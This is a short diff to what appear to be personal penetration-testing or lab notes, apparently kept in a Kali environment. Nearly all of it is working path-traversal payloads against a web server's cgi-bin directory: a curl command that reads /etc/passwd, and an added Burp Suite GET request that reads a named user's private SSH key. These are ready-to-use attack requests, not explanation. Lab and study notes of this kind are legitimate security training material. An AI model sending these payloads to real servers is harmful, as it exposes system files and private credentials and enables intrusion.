@@ -144,6 +144,8 @@ kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/
 ## cgi-bin exploit
 ```
 curl --silent --path-as-is --insecure -k "target/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+In Burpsuite
+GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/home/mollie/.ssh/id_ecdsa HTTP/1.1
 ```
 
 ## Encoding
